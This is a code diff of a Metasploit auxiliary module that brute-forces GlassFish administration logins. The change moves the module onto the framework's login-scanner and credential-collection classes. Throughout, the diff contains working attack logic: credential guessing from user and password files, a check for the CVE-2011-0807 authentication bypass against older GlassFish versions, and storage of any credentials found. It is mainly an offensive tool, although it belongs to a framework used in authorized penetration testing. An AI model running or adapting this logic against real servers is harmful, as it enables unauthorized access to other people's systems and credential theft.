@@ -1,9 +1,11 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
+require 'metasploit/framework/login_scanner/glassfish'
+require 'metasploit/framework/credential_collection'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -16,217 +18,188 @@ class Metasploit3 < Msf::Auxiliary
     super(
       'Name'           => 'GlassFish Brute Force Utility',
       'Description'    => %q{
-        This module attempts to login to GlassFish instance using username
-        and password combindations indicated by the USER_FILE, PASS_FILE,
-        and USERPASS_FILE options.
+        This module attempts to login to GlassFish instance using username and password
+        combindations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
+        It will also try to do an authentication bypass against older versions of GlassFish.
+        Note: by default, GlassFish 4.0 requires HTTPS, which means you must set the SSL option
+        to true, and SSLVersion to TLS1. It also needs Secure Admin to access the DAS remotely.
       },
       'Author'         =>
         [
-          'Joshua Abraham <jabra[at]rapid7.com>'
+          'Joshua Abraham <jabra[at]spl0it.org>', # @Jabra
+          'sinn3r'
         ],
       'References'     =>
         [
           ['CVE', '2011-0807'],
-          ['OSVDB', '71948'],
+          ['OSVDB', '71948']
         ],
       'License'        => MSF_LICENSE
     )
 
     register_options(
       [
+        # There is no TARGETURI because when Glassfish is installed, the path is /
         Opt::RPORT(4848),
-        OptString.new('TARGETURI', [true, 'The URI path of the GlassFish Server', '/']),
         OptString.new('USERNAME',[true, 'A specific username to authenticate as','admin']),
+        OptBool.new('SSL', [false, 'Negotiate SSL for outgoing connections', false]),
+        OptEnum.new('SSLVersion', [false, 'Specify the version of SSL that should be used', 'TLS1', ['SSL2', 'SSL3', 'TLS1']])
       ], self.class)
   end
 
   #
-  # Return GlassFish's edition (Open Source or Commercial) and version (2.x, 3.0, 3.1, 9.x) and
-  # banner (ex: Sun Java System Application Server 9.x)
+  # Module tracks the session id, and then it will have to pass the last known session id to
+  # the LoginScanner class so the authentication can proceed properly
   #
-  def get_version(res)
-    #Extract banner from response
-    banner = res.headers['Server'] || ''
 
-    #Default value for edition and glassfish version
-    edition = 'Commercial'
-    version = 'Unknown'
-
-    #Set edition (Open Source or Commercial)
-    p = /(Open Source|Sun GlassFish Enterprise Server|Sun Java System Application Server)/
-    edition = 'Open Source' if banner =~ p
-
-    #Set version.  Some GlassFish servers return banner "GlassFish v3".
-    if banner =~ /(GlassFish Server|Open Source Edition) (\d\.\d)/
-      version = $2
-    elsif banner =~ /GlassFish v(\d)/ and version.nil?
-      version = $1
-    elsif banner =~ /Sun GlassFish Enterprise Server v2/ and version.nil?
-      version = '2.x'
-    elsif banner =~ /Sun Java System Application Server 9/ and version.nil?
-      version = '9.x'
-    end
-
-    print_status("Unsupported version: #{banner}") if version.nil? or version == 'Unknown'
-
-    return edition, version, banner
-  end
-
-  def log_success(user,pass)
-    print_good("#{target_host()} - GlassFish - SUCCESSFUL login for '#{user}' : '#{pass}'")
-    report_auth_info(
-      :host   => rhost,
-      :port   => rport,
-      :sname => (ssl ? 'https' : 'http'),
-      :user   => user,
-      :pass   => pass,
-      :proof  => "WEBAPP=\"GlassFish\", VHOST=#{vhost}",
-      :source_type => "user_supplied",
-      :active => true
-    )
+  # Overrides the ssl method from HttpClient
+  def ssl
+    @scanner.ssl || datastore['SSL']
   end
 
   #
-  # Send GET or POST request, and return the response
+  # For a while, older versions of Glassfish didn't need to set a password for admin,
+  # but looks like no longer the case anymore, which means this method is getting useless
+  # (last tested: Aug 2014)
   #
-  def send_request(path, method, session='', data=nil, ctype=nil)
-
-    headers = {}
-    headers['Cookie'] = "JSESSIONID=#{session}" if session != ''
-    headers['Content-Type'] = ctype if ctype != nil
-    headers['Content-Length'] = data.length if data != nil
-
-    uri = normalize_uri(target_uri.path)
-    res = send_request_raw({
-      'uri'	  => "#{uri}#{path}",
-      'method'  => method,
-      'data'	  => data,
-      'headers' => headers,
-    }, 90)
-
-    return res
-  end
-
-  #
-  # Try to login to Glassfish with a credential, and return the response
-  #
-  def try_login(user, pass)
-    data  = "j_username=#{Rex::Text.uri_encode(user.to_s)}&"
-    data << "j_password=#{Rex::Text.uri_encode(pass.to_s)}&"
-    data << "loginButton=Login"
-
-    path = '/j_security_check'
-    res = send_request(path, 'POST', '', data, 'application/x-www-form-urlencoded')
-
-    return res
-  end
-
-  def try_glassfish_auth_bypass(version)
-    print_status("Trying GlassFish authentication bypass..")
+  def is_password_required?(version)
     success = false
 
-    if version == '2.x' or version == '9.x'
-      res = send_request('/applications/upload.jsf', 'get')
+    if version =~ /^[29]\.x$/
+      res = send_request_cgi({'uri'=>'/applications/upload.jsf'})
       p = /<title>Deploy Enterprise Applications\/Modules/
-      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
+      if (res && res.code.to_i == 200 && res.body.match(p) != nil)
         success = true
       end
-    else
-      # 3.0
-      res = send_request('/common/applications/uploadFrame.jsf', 'get')
+    elsif version =~ /^3\./
+      res = send_request_cgi({'uri'=>'/common/applications/uploadFrame.jsf'})
       p = /<title>Deploy Applications or Modules/
-      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
+      if (res && res.code.to_i == 200 && res.body.match(p) != nil)
         success = true
       end
     end
 
-    if success == true
-      print_good("#{target_host} - GlassFish - SUCCESSFUL authentication bypass")
-      report_auth_info(
-        :host	=> rhost,
-        :port	=> rport,
-        :sname => (ssl ? 'https' : 'http'),
-        :user	=> '',
-        :pass	=> '',
-        :proof	=> "WEBAPP=\"GlassFish\", VHOST=#{vhost}",
-        :source_type => "user_supplied",
-        :active => true
-      )
-    else
-      print_error("#{target_host()} - GlassFish - Failed authentication bypass")
-    end
-
-    return success
+    success
   end
 
-  def try_glassfish_login(version,user,pass)
-    success = false
-    session = ''
-    res = ''
-    if version == '2.x' or version == '9.x'
-      print_status("Trying credential GlassFish 2.x #{user}:'#{pass}'....")
-      res = try_login(user,pass)
-      if res and res.code == 302
-        session = $1 if res && res.get_cookies =~ /JSESSIONID=(.*); /i
-        res = send_request('/applications/upload.jsf', 'GET', session)
 
-        p = /<title>Deploy Enterprise Applications\/Modules/
-        if (res and res.code.to_i == 200 and res.body.match(p) != nil)
-          success = true
-        end
-      end
+  def init_loginscanner(ip)
+    @cred_collection = Metasploit::Framework::CredentialCollection.new(
+      blank_passwords: datastore['BLANK_PASSWORDS'],
+      pass_file:       datastore['PASS_FILE'],
+      password:        datastore['PASSWORD'],
+      user_file:       datastore['USER_FILE'],
+      userpass_file:   datastore['USERPASS_FILE'],
+      username:        datastore['USERNAME'],
+      user_as_pass:    datastore['USER_AS_PASS']
+    )
 
-    else
-      print_status("Trying credential GlassFish 3.x #{user}:'#{pass}'....")
-      res = try_login(user,pass)
-      if res and res.code == 302
-        session = $1 if res && res.get_cookies =~ /JSESSIONID=(.*); /i
-        res = send_request('/common/applications/uploadFrame.jsf', 'GET', session)
+    @scanner = Metasploit::Framework::LoginScanner::Glassfish.new(
+      host:               ip,
+      port:               rport,
+      proxies:            datastore["PROXIES"],
+      cred_details:       @cred_collection,
+      stop_on_success:    datastore['STOP_ON_SUCCESS'],
+      connection_timeout: 5
+    )
 
-        p = /<title>Deploy Applications or Modules/
-        if (res and res.code.to_i == 200 and res.body.match(p) != nil)
-          success = true
-        end
-      end
-    end
-
-    if success == true
-      log_success(user,pass)
-    else
-      msg = "#{target_host()} - GlassFish - Failed to authenticate login for '#{user}' : '#{pass}'"
-      print_error(msg)
-    end
-
-    return success, res, session
+    @scanner.ssl         = datastore['SSL']
+    @scanner.ssl_version = datastore['SSLVERSION']
   end
 
+  def do_report(ip, port, result)
+    service_data = {
+      address: ip,
+      port: port,
+      service_name: 'http',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: result.credential.private,
+      private_type: :password,
+      username: result.credential.public,
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      last_attempted_at: DateTime.now,
+      status: result.status
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+  def bruteforce(ip)
+    @scanner.scan! do |result|
+      case result.status
+      when Metasploit::Model::Login::Status::SUCCESSFUL
+        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
+        do_report(ip, rport, result)
+        :next_user
+      when Metasploit::Model::Login::Status::DENIED_ACCESS
+        print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
+        do_report(ip, rport, result)
+        :next_user
+      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+        if datastore['VERBOSE']
+          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+        end
+        invalidate_login(
+            address: ip,
+            port: rport,
+            protocol: 'tcp',
+            public: result.credential.public,
+            private: result.credential.private,
+            realm_key: result.credential.realm_key,
+            realm_value: result.credential.realm,
+            status: result.status
+        )
+        :abort
+      when Metasploit::Model::Login::Status::INCORRECT
+        if datastore['VERBOSE']
+          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+        end
+        invalidate_login(
+            address: ip,
+            port: rport,
+            protocol: 'tcp',
+            public: result.credential.public,
+            private: result.credential.private,
+            realm_key: result.credential.realm_key,
+            realm_value: result.credential.realm,
+            status: result.status
+        )
+      end
+    end
+  end
+
+
+
+  #
+  # main
+  #
   def run_host(ip)
-    #Invoke index to gather some info
-    res = send_request('/common/index.jsf', 'GET')
-
-    #Abort if res returns nil due to an exception (broken pipe or timeout)
-    if res.nil?
-      print_error("Unable to get a response from the server.")
+    init_loginscanner(ip)
+    msg = @scanner.check_setup
+    if msg
+      print_brute :level => :error, :ip => rhost, :msg => msg
       return
     end
 
-    if res.code.to_i == 302
-      res = send_request('/login.jsf', 'GET')
+    print_brute :level=>:status, :ip=>rhost, :msg=>('Checking if Glassfish requires a password...')
+    if @scanner.version =~ /^[239]\.x$/ && is_password_required?(@scanner.version)
+      print_brute :level => :good, :ip => ip, :msg => "Note: This Glassfish does not require a password"
+    else
+      print_brute :level=>:status, :ip=>rhost, :msg=>("Glassfish is protected with a password")
     end
 
-    #Get GlassFish version
-    edition, version, banner = get_version(res)
-    path = normalize_uri(target_uri.path)
-    target_url = "http://#{rhost.to_s}:#{rport.to_s}/#{path.to_s}"
-    print_status("#{target_url} - GlassFish - Attempting authentication")
-
-    if (version == '2.x' or version == '9.x' or version == '3.0')
-      try_glassfish_auth_bypass(version)
-    end
-
-    each_user_pass do |user, pass|
-      try_glassfish_login(version, user, pass)
-    end
+    bruteforce(ip) unless @scanner.version.blank?
   end
 
 end
